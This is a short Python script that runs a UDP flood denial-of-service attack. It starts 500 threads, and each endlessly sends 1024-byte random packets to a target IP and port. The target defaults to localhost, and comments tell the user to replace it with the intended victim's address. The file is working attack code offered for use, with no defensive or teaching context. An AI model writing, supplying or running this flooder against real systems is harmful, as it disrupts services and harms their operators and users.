import socket
import random
import threading

# Configuration
TARGET_IP = '127.0.0.1'  # Replace with the IP address of the target
TARGET_PORT = 80  # Replace with the port number of the target
NUM_THREADS = 500  # Number of threads to simulate a larger number of requests

def udp_flood():
    while True:
        # Create a socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Generate a random byte message
        message = random._urandom(1024)  # 1024-byte random message
        
        # Send the UDP packet to the target
        s.sendto(message, (TARGET_IP, TARGET_PORT))
        
        # Close the socket (optional, depending on how you want to handle socket re-use)
        s.close()

# Create multiple threads to simulate the UDP flood attack
for i in range(NUM_THREADS):
    thread = threading.Thread(target=udp_flood)
    thread.start()
